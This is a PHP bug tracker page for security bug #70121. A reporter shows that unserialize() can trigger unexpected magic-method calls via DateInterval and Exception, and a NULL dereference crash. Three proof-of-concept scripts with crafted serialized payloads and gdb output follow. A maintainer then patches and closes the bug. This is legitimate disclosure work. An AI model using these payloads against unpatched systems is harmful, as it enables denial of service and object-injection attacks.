@@ -1,0 +1,318 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    
+        <link rel='alternate' type='application/rss+xml' title='*General Issues Bug #70121 - RDF' href='rss/bug.php?id=70121'>
+        <link rel='alternate' type='application/rss+xml' title='*General Issues Bug #70121 - RSS 2.0' href='rss/bug.php?id=70121&format=rss2'>
+        <base href="https://bugs.php.net/">
+    <title>PHP :: Sec Bug #70121 :: unserialize() could lead to unexpected methods execution / NULL pointer deref</title>
+    <link rel="shortcut icon" href="https://bugs.php.net/images/favicon.ico">
+    <link rel="stylesheet" href="https://bugs.php.net/css/style.css">
+</head>
+
+<body>
+
+<table id="top" class="head" cellspacing="0" cellpadding="0">
+    <tr>
+        <td class="head-logo">
+            <a href="/"><img src="images/logo.png" alt="Bugs" vspace="2" hspace="2"></a>
+        </td>
+
+        <td class="head-menu">
+            <a href="https://php.net/">php.net</a>&nbsp;|&nbsp;
+            <a href="https://php.net/support.php">support</a>&nbsp;|&nbsp;
+            <a href="https://php.net/docs.php">documentation</a>&nbsp;|&nbsp;
+            <a href="report.php">report a bug</a>&nbsp;|&nbsp;
+            <a href="search.php">advanced search</a>&nbsp;|&nbsp;
+            <a href="search-howto.php">search howto</a>&nbsp;|&nbsp;
+            <a href="stats.php">statistics</a>&nbsp;|&nbsp;
+            <a href="random">random bug</a>&nbsp;|&nbsp;
+            <a href="login.php">login</a>
+        </td>
+    </tr>
+
+    <tr>
+        <td class="head-search" colspan="2">
+            <form method="get" action="search.php">
+                <p class="head-search">
+                    <input type="hidden" name="cmd" value="display">
+                    <small>go to bug id or search bugs for</small>
+                    <input class="small" type="text" name="search_for" value="" size="30">
+                    <input type="image" src="images/small_submit_white.gif" alt="search" style="vertical-align: middle;">
+                </p>
+            </form>
+        </td>
+    </tr>
+</table>
+
+<table class="middle" cellspacing="0" cellpadding="0">
+    <tr>
+        <td class="content">
+<div id="bugheader">
+    <table id="details">
+        <tr id="title">
+            <th class="details" id="number"><a href="bug.php?id=70121">Sec Bug</a>&nbsp;#70121</th>
+            <td id="summary" colspan="5">unserialize() could lead to unexpected methods execution / NULL pointer deref</td>
+        </tr>
+        <tr id="submission">
+            <th class="details">Submitted:</th>
+            <td style="white-space: nowrap;">2015-07-23 21:40 UTC</td>
+            <th class="details">Modified:</th>
+            <td style="white-space: nowrap;">2015-08-04 22:21 UTC</td>
+            <td rowspan="6">
+
+
+            </td>
+        </tr>
+
+        <tr id="submitter">
+            <th class="details">From:</th>
+            <td>andrea &#x64;&#111;&#x74; palazzo &#x61;&#116; truel &#x64;&#111;&#x74; it</td>
+            <th class="details">Assigned:</th>
+            <td></td>
+        </tr>
+
+        <tr id="categorization">
+            <th class="details">Status:</th>
+            <td>Closed</td>
+            <th class="details">Package:</th>
+            <td><a href="search.php?cmd=display&amp;package_name[]=%2AGeneral+Issues">*General Issues</a></td>
+        </tr>
+
+        <tr id="situation">
+            <th class="details">PHP Version:</th>
+            <td>Irrelevant</td>
+            <th class="details">OS:</th>
+            <td>Ubuntu x86_64</td>
+        </tr>
+
+        <tr id="private">
+            <th class="details">Private report:</th>
+            <td>No</td>
+            <th class="details">CVE-ID:</th>
+            <td><em>None</em></td>
+        </tr>
+    </table>
+</div>
+
+<div class="controls">
+<span id='control_0' class='control active'>View</span>
+<span id='control_3' class='control'><a href='bug.php?id=70121&amp;edit=3'>Add Comment</a></span>
+<span id='control_1' class='control'><a href='bug.php?id=70121&amp;edit=1'>Developer</a></span>
+<span id='control_2' class='control'><a href='bug.php?id=70121&amp;edit=2'>Edit</a></span>
+</div>
+<div class="clear"></div>
+
+
+
+<div class='comment type_comment' ><a name="1437687606">&nbsp;</a><strong>[2015-07-23 21:40 UTC] andrea &#x64;&#111;&#x74; palazzo &#x61;&#116; truel &#x64;&#111;&#x74; it</strong>
+<pre class='note'>Description:
+------------
+The report below is about 3 different issues, first two have been tested on latest versions on each branch, #3 seems not to be affecting PHP7. 
+First one is probably more a design issue than a flaw, by the way I'm quite positive that could be avoided or at least documented.
+
+
+OVERVIEW
+
+Due to an implicit string conversion in DateInterval's __wakeup() and an insufficient type check in Exception's __toString(), unserialize() calls could result in unexpected method executions without any manipulation needed on the unserialized data. This behavior significantly increase the attack surface in Object injection contexts (vulnerabilities like CVE-2015-4147, for example, could in fact be triggered by standard unserialize() calls this way).
+Lastly, the Exception issue also leads to a NULL pointer dereference, making possible to remotely crash PHP.
+
+DETAILS
+
+In php_date.c, php_date_interval_initialize_from_hash, &quot;days&quot; and &quot;special_amount&quot; fields are retrieved through PHP_DATE_INTERVAL_READ_PROPERTY_I64() which perform a convert_to_string() that, in case of Object, call its __toString() method.
+
+#PoC1
+
+In zend_exceptions.c, __toString, &quot;previous&quot; is supposed to hold a reference to the previous Exception object in order to construct the stack trace.
+Problem is that no checks are actually performed on it being an instance of the Exception class, thus any Object could be supplied instead.
+The subsequent attempt to call &quot;getTraceAsString&quot; on it, if not declared in the involved Class, would then result in __call (and also __get) being executed.
+
+#PoC2
+
+If no __call is specified by the object supplied as previous, zend_call_function would exit on failure with &quot;fci-&gt;retval_ptr_ptr&quot; (referenced by &quot;trace&quot;) still pointing to NULL, so that the following 
+
+if (Z_TYPE_P(trace) != IS_STRING) {
+
+would crash PHP trying to access 0x0+0x14.
+
+#PoC3
+
+
+
+
+
+
+
+
+
+
+Test script:
+---------------
+#PoC1
+
+&lt;?php
+
+/*
+$ php poc1.php
+unexpected
+*/
+
+class Pwn {
+
+	function __toString() {
+		die(&quot;surprise\n&quot;);
+	}
+
+}
+
+unserialize('O:12:&quot;DateInterval&quot;:1:{s:4:&quot;days&quot;;O:3:&quot;Pwn&quot;:0:{}}');
+
+?&gt;
+
+
+&lt;?php
+
+/*$ 
+php poc2.php
+surprise 1
+surprise 1
+surprise 1
+surprise 2
+*/
+
+class Pwn {
+
+	function __call($x,$y) {
+		die(&quot;surprise 2\n&quot;);
+	}
+
+	function __get($x) {
+		echo &quot;surprise 1\n&quot;;
+	}
+
+}
+
+unserialize('O:12:&quot;DateInterval&quot;:1:{s:4:&quot;days&quot;;O:9:&quot;Exception&quot;:7:{s:10:&quot;'.&quot;\0&quot;.'*'.&quot;\0&quot;.'message&quot;;s:1:&quot;x&quot;;s:17:&quot;'.&quot;\0&quot;.'Exception'.&quot;\0&quot;.'string&quot;;s:1:&quot;A&quot;;s:7:&quot;'.&quot;\0&quot;.'*'.&quot;\0&quot;.'code&quot;;i:0;s:7:&quot;'.&quot;\0&quot;.'*'.&quot;\0&quot;.'file&quot;;s:1:&quot;a&quot;;s:7:&quot;'.&quot;\0&quot;.'*'.&quot;\0&quot;.'line&quot;;i:1337;s:16:&quot;'.&quot;\0&quot;.'Exception'.&quot;\0&quot;.'trace&quot;;a:0:{}s:19:&quot;'.&quot;\0&quot;.'Exception'.&quot;\0&quot;.'previous&quot;;O:3:&quot;Pwn&quot;:0:{}}}');
+
+?&gt;
+
+&lt;?php
+
+/*
+gdb$ r poc3.php
+Starting program: /usr/bin/php5 d.php
+
+PHP Notice:  Undefined property: stdClass::$message in poc3.php on line 1
+PHP Notice:  Undefined property: stdClass::$file in poc3.php on line 1
+PHP Notice:  Undefined property: stdClass::$line in poc3.php on line 1
+
+Program received signal SIGSEGV, Segmentation fault.
+
+0x00000000006f52c8 in zim_exception___toString (ht=&lt;optimized out&gt;, return_value=0x7ffff7fc34d8, return_value_ptr=&lt;optimized out&gt;, this_ptr=0x7ffff7fc2f28, return_value_used=&lt;optimized out&gt;) at /build/php5-LRe0pE/php5-5.6.11+dfsg/Zend/zend_exceptions.c:673
+673			if (Z_TYPE_P(trace) != IS_STRING) {
+gdb$ x/i $pc
+=&gt; 0x6f52c8 &lt;zim_exception___toString+568&gt;:	cmp    BYTE PTR [rax+0x14],0x6
+gdb$ p $rax
+$1 = 0x0
+
+*/
+
+unserialize('O:12:&quot;DateInterval&quot;:1:{s:4:&quot;days&quot;;O:9:&quot;Exception&quot;:7:{s:10:&quot;'.&quot;\0&quot;.'*'.&quot;\0&quot;.'message&quot;;s:1:&quot;x&quot;;s:17:&quot;'.&quot;\0&quot;.'Exception'.&quot;\0&quot;.'string&quot;;s:1:&quot;A&quot;;s:7:&quot;'.&quot;\0&quot;.'*'.&quot;\0&quot;.'code&quot;;i:0;s:7:&quot;'.&quot;\0&quot;.'*'.&quot;\0&quot;.'file&quot;;s:1:&quot;a&quot;;s:7:&quot;'.&quot;\0&quot;.'*'.&quot;\0&quot;.'line&quot;;i:1337;s:16:&quot;'.&quot;\0&quot;.'Exception'.&quot;\0&quot;.'trace&quot;;a:0:{}s:19:&quot;'.&quot;\0&quot;.'Exception'.&quot;\0&quot;.'previous&quot;;O:8:&quot;stdClass&quot;:0:{}}}');
+
+?&gt;
+
+
+</pre>
+</div><h2>Patches</h2>
+<p><a href='patch-add.php?bug_id=70121'>Add a Patch</a></p><h2>Pull Requests</h2>
+<p><a href='gh-pull-add.php?bug_id=70121'>Add a Pull Request</a></p><h2 style="border-bottom:2px solid #666;margin-bottom:0;padding:5px 0;">History</h2><div id='comment_filter' class='controls comments'><span id='type_all' class='control active' onclick='do_comment(this);'>All</span><span id='type_comment' class='control ' onclick='do_comment(this);'>Comments</span><span id='type_log' class='control ' onclick='do_comment(this);'>Changes</span><span id='type_svn' class='control ' onclick='do_comment(this);'>Git/SVN commits</span><span id='type_related' class='control ' onclick='do_comment(this);'>Related reports</span>            </div>
+            <div id='comments_view' style='clear:both;'>
+<div class='comment type_comment' ><a name="1437955909">&nbsp;</a><strong>[2015-07-27 00:11 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
+<pre class='note'>Please see patch in: <a href="https://gist.github.com/smalyshev/6a36eb265b977645d5d7" rel="nofollow">https://gist.github.com/smalyshev/6a36eb265b977645d5d7</a>
+</pre>
+</div><div class='comment type_comment' ><a name="1438595152">&nbsp;</a><strong>[2015-08-03 09:45 UTC] andrea &#x64;&#111;&#x74; palazzo &#x61;&#116; truel &#x64;&#111;&#x74; it</strong>
+<pre class='note'>Seems ok to me, it solves both the null-pointer dereference and the previous exception thing. Are you planning to refactor DateTime also or is that one an expected behavior?
+
+Regards,
+Andrea
+</pre>
+</div><div class='comment type_svn' ><a name="1438726950">&nbsp;</a><strong>[2015-08-04 22:22 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
+<pre class='note'>Automatic comment on behalf of stas
+Revision: <a href="http://git.php.net/?p=php-src.git;a=commit;h=e488690d957fce0dbdabe619adbe314ada498215" rel="nofollow">http://git.php.net/?p=php-src.git;a=commit;h=e488690d957fce0dbdabe619adbe314ada498215</a>
+Log: Fix <a href='bug.php?id=70121'>bug #70121</a> (unserialize() could lead to unexpected methods execution / NULL pointer deref)
+</pre>
+</div><div class='comment type_log' ><a name="1438726950">&nbsp;</a><strong>[2015-08-04 22:22 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
+<div class='log_note'><div class="changeset">
+<span class="removed">-Status: Open</span>
+<span class="added">+Status: Closed</span>
+</div></div></div><div class='comment type_svn' ><a name="1438727018">&nbsp;</a><strong>[2015-08-04 22:23 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
+<pre class='note'>Automatic comment on behalf of stas
+Revision: <a href="http://git.php.net/?p=php-src.git;a=commit;h=e488690d957fce0dbdabe619adbe314ada498215" rel="nofollow">http://git.php.net/?p=php-src.git;a=commit;h=e488690d957fce0dbdabe619adbe314ada498215</a>
+Log: Fix <a href='bug.php?id=70121'>bug #70121</a> (unserialize() could lead to unexpected methods execution / NULL pointer deref)
+</pre>
+</div><div class='comment type_svn' ><a name="1438727412">&nbsp;</a><strong>[2015-08-04 22:30 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
+<pre class='note'>Automatic comment on behalf of stas
+Revision: <a href="http://git.php.net/?p=php-src.git;a=commit;h=e488690d957fce0dbdabe619adbe314ada498215" rel="nofollow">http://git.php.net/?p=php-src.git;a=commit;h=e488690d957fce0dbdabe619adbe314ada498215</a>
+Log: Fix <a href='bug.php?id=70121'>bug #70121</a> (unserialize() could lead to unexpected methods execution / NULL pointer deref)
+</pre>
+</div><div class='comment type_svn' ><a name="1438759777">&nbsp;</a><strong>[2015-08-05 07:29 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
+<pre class='note'>Automatic comment on behalf of stas
+Revision: <a href="http://git.php.net/?p=php-src.git;a=commit;h=e488690d957fce0dbdabe619adbe314ada498215" rel="nofollow">http://git.php.net/?p=php-src.git;a=commit;h=e488690d957fce0dbdabe619adbe314ada498215</a>
+Log: Fix <a href='bug.php?id=70121'>bug #70121</a> (unserialize() could lead to unexpected methods execution / NULL pointer deref)
+</pre>
+</div><div class='comment type_svn' ><a name="1438769550">&nbsp;</a><strong>[2015-08-05 10:12 UTC] <a href="//people.php.net/ab">ab@php.net</a></strong>
+<pre class='note'>Automatic comment on behalf of stas
+Revision: <a href="http://git.php.net/?p=php-src.git;a=commit;h=e488690d957fce0dbdabe619adbe314ada498215" rel="nofollow">http://git.php.net/?p=php-src.git;a=commit;h=e488690d957fce0dbdabe619adbe314ada498215</a>
+Log: Fix <a href='bug.php?id=70121'>bug #70121</a> (unserialize() could lead to unexpected methods execution / NULL pointer deref)
+</pre>
+</div></div>
+        </td>
+    </tr>
+</table>
+
+<script src='js/util.js'></script>
+<script src='https://ajax.googleapis.com/ajax/libs/jquery/1.4.2/jquery.min.js'></script>
+<script src="js/jquery.cookie.js"></script>
+<script>
+function do_comment(nd)
+{
+    $('#comment_filter > .control.active').removeClass("active");
+    $(nd).addClass("active");
+
+    $.cookie('history_tab', nd.id, { expires: 365 });
+
+    if (nd.id == 'type_all') {
+        $('#comments_view > .comment:hidden').show('slow');
+    } else {
+        $('#comments_view > .comment').each(function(i) {
+            if ($(this).hasClass(nd.id)) {
+                $(this).show('slow');
+            } else {
+                $(this).hide('slow');
+            }
+        });
+    }
+    return false;
+}
+</script>
+<table class="foot" cellspacing="0" cellpadding="0">
+    <tr>
+        <td class="foot-bar" colspan="2">&nbsp;</td>
+    </tr>
+
+    <tr>
+        <td class="foot-copy">
+            <small>
+                <a href="https://php.net/"><img src="images/logo-small.gif" align="left" valign="middle" hspace="3" alt="PHP"></a>
+                <a href="https://php.net/copyright.php">Copyright &copy; 2001-2021 The PHP Group</a><br>
+                All rights reserved.
+            </small>
+        </td>
+        <td class="foot-source">
+            <small>Last updated: Sat Oct 30 19:03:34 2021 UTC</small>
+        </td>
+    </tr>
+</table>
+</body>
+</html>
